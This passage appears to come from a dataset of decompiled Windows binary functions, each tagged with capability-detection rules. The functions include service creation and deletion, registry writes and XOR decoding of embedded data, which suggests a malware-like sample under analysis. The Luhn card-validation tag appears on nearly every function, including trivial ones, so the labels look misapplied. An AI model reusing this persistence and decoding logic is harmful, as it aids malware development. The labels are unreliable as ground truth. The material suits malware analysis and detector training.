sub.MSVCRT.dll__initterm(0x407000, 0x407004);\n    puVar2 = *_sym.imp.MSVCRT.dll__acmdln;\n    if (*puVar2 != 0x22) {\n        do {\n            if (*puVar2 < 0x21) goto code_r0x00405063;\n            puVar2 = puVar2 + 1;\n        } while( true );\n    }\n    do {\n        puVar2 = puVar2 + 1;\n        if (*puVar2 == 0) break;\n    } while (*puVar2 != 0x22);\n    if (*puVar2 != 0x22) goto code_r0x00405063;\n    do {\n        puVar2 = puVar2 + 1;\ncode_r0x00405063:\n    } while ((*puVar2 != 0) && (*puVar2 < 0x21));\n    var_30h = 0;\n    (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&lpStartupInfo);\n    if ((var_30h & 1) == 0) {\n        var_2ch._0_2_ = 10;\n    }\n    argv = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar2, var_2ch);\n    var_68h = main(argv);\n    (*_sym.imp.MSVCRT.dll_exit)(var_68h);\n    sub.MSVCRT.dll__XcptFilter(**var_14h, var_14h);\n    return;\n}\n",
        "token_count": 826
    },
    "00401f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040200b) overlaps instruction at (ram,0x0040200a)\n// \n// WARNING: Removing unreachable block (ram,0x00402008)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401f30(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    bool bVar3;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    iVar2 = arg_14h;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            bVar3 = (POPCOUNT(arg_8h + 1U & 0xff) & 1U) == 0;\n            if ((bVar3) || (iVar2 = unaff_ESI,  !bVar3)) {\n                unaff_EBX = unaff_EBX & 0xffffff00 | *(var_8h + arg_10h);\n                iVar2 = var_ch;\n            }\n            *(unaff_EBX + 0x5d8af475) = 0xffffffff;\n            *(arg_18h + -1 + iVar2) = var_10h ^ unaff_EBX ^ *((iVar2 + -1) % arg_ch + arg_8h);\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar1;\n            unaff_ESI = iVar2 + 2;\n            *(iVar2 + arg_18h) = var_10h ^ uVar1;\n            iVar2 = var_8h + 1;\n            var_ch = unaff_ESI;\n            var_8h = iVar2;\n        } while (iVar2 < arg_14h);\n    }\n    return iVar2;\n}\n",
        "token_count": 538
    },
    "00402040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402040(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402e80(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "004022a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022da) overlaps instruction at (ram,0x004022d7)\n// \n\nvoid __cdecl fcn.004022a0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char *pcVar1;\n    char extraout_DL;\n    char unaff_BL;\n    bool bVar2;\n    \n    if (arg_ch == 1) {\n        bVar2 = (0x4d - unaff_BL & 0x26) << 8 == 1;\n        pcVar1 = fcn.004012d0();\n        if ((!bVar2) && (bVar2)) {\n            *pcVar1 = *pcVar1 + pcVar1;\n            pcVar1[-0x7b] = pcVar1[-0x7b] + extraout_DL;\n            return;\n        }\n        fcn.004023a0();\n        fcn.00404300();\n        if (*0x423634 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004032e0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 291
    },
    "00402530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402530(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00402660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402660(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00402cf0(arg_8h_00, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 118
    },
    "004027a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004027a0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *unaff_EDI;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    bVar5 = arg_14h != 0;\n    if (bVar5) {\n        if ((bVar5) && (!bVar5)) {\n            arg_8h = unaff_EDI;\n        }\n        for (; arg_8h <= pcVar2; arg_8h = arg_8h + 1) {\n            if (*arg_8h == *arg_10h) {\n                iVar1 = arg_14h + -1;\n                bVar5 = true;\n                pcVar4 = arg_10h;\n                pcVar3 = arg_8h;\n                do {\n                    pcVar3 = pcVar3 + 1;\n                    pcVar4 = pcVar4 + 1;\n                    if (iVar1 == 0) break;\n                    iVar1 = iVar1 + -1;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 341
    },
    "00402830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402895) overlaps instruction at (ram,0x00402891)\n// \n\nbool fcn.00402830(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t unaff_EBX;\n    int32_t iVar5;\n    char *pcVar6;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((!in_ZF) && (in_ZF)) {\n        iVar5 = unaff_EBX + 1;\n        if (in_CF || iVar5 == 0) {\n            if (iVar5 == 0) {\n                iVar5 = (*_sym.imp.MSVCRT.dll__access)();\n                if (iVar5 == -1) {\n                    return true;\n                }\n                return false;\n            }\n            goto code_r0x00402890;\n        }\n        uVar3 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar3, in_EAX + uVar3 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - iVar5;\n    }\n    iVar5 = fcn.004034f0(&var_4h);\n    if (iVar5 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\ncode_r0x00402890:\n    uVar4 = 0xffffffff;\n    pcVar6 = var_4h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar2 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar2 != '\\0');\n    iVar5 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, var_4h, ~uVar4 - 1);\n    return iVar5 == 0;\n}\n",
        "token_count": 528
    },
    "00402930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402975) overlaps instruction at (ram,0x00402974)\n// \n\nuint * __cdecl fcn.00402930(uint hSCManager, uint lpServiceName)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    char extraout_CL;\n    int32_t unaff_EBX;\n    \n    puVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (puVar1 != NULL) {\n        puVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(puVar1);\n        *puVar2 = *puVar1;\n        *(unaff_EBX + 0x526650f8) = *(unaff_EBX + 0x526650f8) + extraout_CL;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(puVar1 + 1, puVar1 + 1 >> 0x10);\n        return puVar2 + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 224
    },
    "004029b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402a4b) overlaps instruction at (ram,0x00402a48)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004029b0(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar4 = &var_20fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &s + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407024, &lpBuffer);\n    while( true ) {\n        fcn.00403a30(&var_4h, &var_8h);\n        bVar5 = false;\n        puVar1 = fcn.00402af0();\n        if ((bVar5) || (!bVar5)) break;\n        pcVar2 = puVar1 + 1;\n        if (&stack0xfffffdd8 < *puVar1 || pcVar2 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar2 = *pcVar2 + pcVar2;\n    }\n    iVar3 = fcn.004048b0(&s, var_4h, var_8h);\n    if (iVar3 != 0) {\n        fcn.00403150(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 554
    },
    "00402cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d4b) overlaps instruction at (ram,0x00402d47)\n// \n// WARNING: Removing unreachable block (ram,0x00402d3c)\n\nuint __cdecl fcn.00402cf0(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_CH;\n    int32_t **unaff_EDI;\n    \n    piVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n    if (piVar2 == NULL) {\n        return 0;\n    }\n    iVar3 = *piVar2;\n    *unaff_EDI = piVar2 + 1;\n    *(iVar3 >> 0x1f) = *(iVar3 >> 0x1f) + extraout_CH;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(0x6ab8ec44);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x6ab8ec44);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x6ab8ec44);\n    return 1;\n}\n",
        "token_count": 363
    },
    "004035e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403761) overlaps instruction at (ram,0x0040375c)\n// \n// WARNING: Removing unreachable block (ram,0x00403658)\n\nuint * __fastcall fcn.004035e0(uchar *param_1, uint32_t param_2, uchar *param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    char *in_EAX;\n    char *pcVar6;\n    uint *puVar7;\n    uint unaff_EBX;\n    uchar *puVar8;\n    char *unaff_ESI;\n    char **unaff_EDI;\n    bool in_PF;\n    bool bVar9;\n    char in_SF;\n    char in_OF;\n    uint16_t uStack12;\n    ushort uStack10;\n    int16_t iStack8;\n    \n    puVar8 = &stack0xfffffffc;\n    iStack8 = unaff_EBX;\n    uStack12 = unaff_ESI;\n    uStack10 = unaff_ESI >> 0x10;\n    if ((in_PF) || (!in_PF)) {\n        *param_3 = 0xfa;\n        param_1 = param_3;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        pcVar6 = param_2 + 1;\n        puVar8 = *0x8b17b43a + -1;\n        param_2 = in_EAX & 0xffff0000 | CONCAT11(in_EAX >> 8 | pcVar6, in_EAX);\n        in_OF = SCARRY4(param_2, unaff_EDI);\n        param_2 = param_2 + unaff_EDI;\n        in_SF = param_2 < 0;\n        in_PF = (POPCOUNT(param_2 & 0xff) & 1U) == 0;\n        in_EAX = pcVar6;\n    }\n    if ((in_PF) || (!in_PF)) {\ncode_r0x00403622:\n        param_1[1] = 0x38;\n        if ((in_PF) || (!in_PF)) {\n            param_1[2] = 0x90;\n            if (in_OF == in_SF) goto code_r0x0040363c;\n        }\n        else {\n            param_2 = param_2 & 0xffffff00 | param_2 + in_EAX[0x1b8c0f];\n            in_OF = SCARRY1(*in_EAX, in_EAX);\n            *in_EAX = *in_EAX + in_EAX;\n            in_SF = *in_EAX < '\\0';\ncode_r0x0040363c:\n            if (in_OF != in_SF) {\n                out(0xc4, in_EAX);\n                uStack12 = param_2 & 0xffffff00 | param_2 ^ param_1;\n                *unaff_EDI = in_EAX;\n                uStack10 = (param_2 & 0xffffff00) >> 0x10;\n                unaff_EDI = unaff_EDI + 1;\n            }\n        }\n        param_1[3] = 0xfd;\n        uVar4 = in_EAX + iStack8 | 0x11a9;\n        in_SF = uVar4 < 0;\n        bVar9 = uVar4 == 0;\n        param_1[4] = 0x44;\n        if (0 < uVar4) goto code_r0x00403675;\n    }\n    else {\n        pcVar6 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar8 = puVar8 + -*(puVar8 + 0x5f9dff63);\n        if (puVar8 < 0) {\n            iVar5 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(puVar8 + -0x114, *(puVar8 + 8));\n            if (iVar5 == 0) {\n                return NULL;\n            }\n            return 0x1;\n        }\n        in_OF = '\\0';\n        in_SF = pcVar6 < 0;\n        bVar9 = pcVar6 == NULL;\n        in_PF = (POPCOUNT(pcVar6 & 0xff) & 1U) == 0;\n        if (in_SF) goto code_r0x00403622;\ncode_r0x00403675:\n        if (bVar9 || in_SF) goto code_r0x0040368a;\n    }\n    param_1[5] = 0xfb;\n    uStack12 = unaff_EDI;\n    uStack10 = unaff_EDI >> 0x10;\ncode_r0x0040368a:\n    param_1[6] = 0xa5;\n    param_1[7] = 0xe4;\n    iVar5 = *(puVar8 + 8);\n    *(iVar5 + 8) = 0x61;\n    *(iVar5 + 9) = 0x6f;\n    *(iVar5 + 10) = 0x1f;\n    *(iVar5 + 0xb) = 0x30;\n    iVar2 = *(puVar8 + 8);\n    *(iVar2 + 0xc) = 0x8f;\n    bVar9 = (POPCOUNT(iVar5 ^ unaff_EBX >> 8 | 0x67) & 1U) != 0;\n    *(iVar2 + 0xd) = 0xf0;\n    if ((bVar9) && (!bVar9)) {\n        piVar1 = CONCAT22(uStack10, uStack12) + 0x250577ff;\n        *piVar1 = *piVar1 + 1;\n        pcVar3 = swi(3);\n        puVar7 = (*pcVar3)();\n        return puVar7;\n    }\n    *(iVar2 + 0xe) = 0xbd;\n    puVar7 = *(puVar8 + 0xc);\n    *puVar7 = 0xf;\n    return puVar7;\n}\n",
        "token_count": 1359
    },
    "00403790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004037b3)\n// WARNING: Removing unreachable block (ram,0x004037bd)\n\nvoid __cdecl fcn.00403790(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004035e0(&var_68h, &var_4h);\n    fcn.00403830(&var_68h, var_4h, 0x407490, 0xa180);\n    *arg_8h = 0x407490;\n    *arg_ch = 0xa180;\n    return;\n}\n",
        "token_count": 267
    },
    "00403830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403886) overlaps instruction at (ram,0x00403883)\n// \n// WARNING: Removing unreachable block (ram,0x0040395c)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403830(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uchar *arg_14h)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint32_t in_ECX;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    uint32_t in_EDX;\n    uint8_t uVar6;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    unkbyte10 in_ST0;\n    uint32_t in_stack_51660f70;\n    uint16_t uStack28;\n    uchar *var_4h;\n    \n    var_4h = NULL;\n    if (arg_14h != NULL) {\n        do {\n            uStack28 = in_ECX;\n            bVar8 = (uStack28 | 0x31fd) < 0;\n            uVar3 = var_4h[arg_10h];\n            uVar4 = in_ECX & 0xffffff00 | uVar3;\n            if ((bVar8) || (!bVar8)) {\n                in_EDX = var_4h % arg_ch;\n            }\n            else {\n                pcVar1 = arg_14h + 0x33c68b2f;\n                uVar6 = (unaff_EBX >> 8) << (uVar3 & 0x1f);\n                unaff_EBX = uVar6 << 8;\n                bVar8 = (uVar3 & 0x1f) != 0;\n                if ((bVar8 || pcVar1 != NULL) && (!bVar8 || uVar6 != 0)) {\n                    uVar4 = uVar4 - 1;\n                    if (uVar4 != 0 && ((bVar8 || pcVar1 != NULL) && (!bVar8 || uVar6 != 0))) {\n                        uVar3 = in_EDX >> 8 | pcVar1;\n                        uVar5 = CONCAT11(uVar3, in_EDX);\n                        bVar8 = uVar3 == 0;\n                        if ((!bVar8) && (bVar8)) {\n                            bVar8 = (pcVar1 & 0xe2f4cc58) == 0;\n                        }\n                        *(arg_10h + 1) = 0x70;\n                        puVar7 = var_4h;\n                        if ((!bVar8) && (bVar8)) {\n                            puVar7 = var_4h + -1;\n                            out(*var_4h, uVar5);\n                        }\n                        *(arg_10h + 2) = 0x91;\n                        uVar4 = in_EDX & 0xffff0000 | uVar5;\n                        *(arg_10h + 3) = 0xb3;\n                        *(arg_10h + 4) = 0xed;\n                        *(arg_10h + 5) = 0xd3;\n                        *(arg_10h + 6) = 0x15;\n                        if ((uVar4 < (puVar7 | 0x561b)) && ((puVar7 | 0x561b) <= uVar4)) {\n                            do {\n    // WARNING: Do nothing block with infinite loop\n                            } while( true );\n                        }\n                        *(arg_10h + 7) = 100;\n                        piVar2 = in_EDX & 0xffff0000 | uVar5;\n                        *(arg_8h + 8) = 0x65;\n                        *(arg_8h + 9) = 3;\n                        uStack28 = arg_8h;\n                        uStack28 = uStack28 | 0x31fd;\n                        *(arg_8h + 10) = 0xf3;\n                        if (((-1 < uStack28) && (-1 >= uStack28)) || (*(arg_8h + 0xb) = 0xb5,  uStack28 != 0)) {\n                            *(arg_8h + -0x7ce92414) = in_ST0;\n                            uVar6 = arg_8h - 1U;\n                            uVar3 = 9 < (uVar6 & 0xf) | in_AF;\n                            uVar6 = uVar6 + uVar3 * '\\x06';\n                            *piVar2 = *piVar2 + 0x40c6df84;\n                            uVar4 = arg_8h - 1U & 0xffffff00 |\n                                    uVar6 + (0x90 < (uVar6 & 0xf0) | uVar3 * (0xf9 < uVar6)) * '`';\n                            if ((puVar7 | in_stack_51660f70) == 0) goto code_r0x00403a14;\n                        }\n                        uVar4 = arg_ch;\ncode_r0x00403a14:\n                        *(uVar4 | 0x5f) = 0xc;\n                        return;\n                    }\n                    *pcVar1 = *pcVar1 + pcVar1;\n                }\n            }\n            uVar3 = uVar4 ^ *(in_EDX + arg_8h);\n            in_ECX = uVar4 & 0xffffff00 | uVar3;\n            var_4h[arg_10h] = uVar3;\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 1273
    },
    "004038b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a1b) overlaps instruction at (ram,0x00403a18)\n// \n// WARNING: Removing unreachable block (ram,0x0040395c)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004038b0(uchar *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    char in_CL;\n    int32_t *in_EDX;\n    uchar *unaff_ESI;\n    uchar *puVar4;\n    uint8_t in_AF;\n    bool bVar5;\n    unkbyte10 in_ST0;\n    uint32_t in_stack_51660f70;\n    uint16_t uStack16;\n    \n    bVar5 = (in_CL - 5U & 0x44) == 0;\n    *arg_8h = 0xfd;\n    if ((!bVar5) && (bVar5)) {\n        bVar5 = (in_EAX & 0xe2f4cc58) == 0;\n    }\n    arg_8h[1] = 0x70;\n    puVar4 = unaff_ESI;\n    if ((!bVar5) && (bVar5)) {\n        puVar4 = unaff_ESI + 1;\n        out(*unaff_ESI, in_EDX);\n    }\n    arg_8h[2] = 0x91;\n    arg_8h[3] = 0xb3;\n    arg_8h[4] = 0xed;\n    arg_8h[5] = 0xd3;\n    arg_8h[6] = 0x15;\n    if ((in_EDX < (puVar4 | 0x561b)) && ((puVar4 | 0x561b) <= in_EDX)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[7] = 100;\n    uStack16 = arg_8h;\n    arg_8h[8] = 0x65;\n    arg_8h[9] = 3;\n    uStack16 = uStack16 | 0x31fd;\n    arg_8h[10] = 0xf3;\n    if (((-1 < uStack16) && (-1 >= uStack16)) || (arg_8h[0xb] = 0xb5,  uStack16 != 0)) {\n        *(arg_8h + -0x7ce92414) = in_ST0;\n        uVar2 = arg_8h + -1;\n        uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + uVar1 * '\\x06';\n        *in_EDX = *in_EDX + 0x40c6df84;\n        uVar3 = arg_8h + -1 & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | uVar1 * (0xf9 < uVar2)) * '`';\n        if ((puVar4 | in_stack_51660f70) == 0) goto code_r0x00403a14;\n    }\n    uVar3 = arg_ch;\ncode_r0x00403a14:\n    *(uVar3 | 0x5f) = 0xc;\n    return;\n}\n",
        "token_count": 789
    },
    "00403a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403a50)\n// WARNING: Removing unreachable block (ram,0x00403a54)\n// WARNING: Removing unreachable block (ram,0x00403a55)\n\nvoid __cdecl fcn.00403a30(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004038b0(&var_68h, &var_4h);\n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    fcn.00403830(uVar2 - 0x68, *(uVar2 - 4), 0x411610, 0x12000);\n    puVar3 = *(uVar2 + 0xc);\n    **(uVar2 + 8) = 0x411610;\n    *puVar3 = 0x12000;\n    return;\n}\n",
        "token_count": 343
    },
    "00403ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403ab0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403c90(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405130;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407418);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004040cd:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            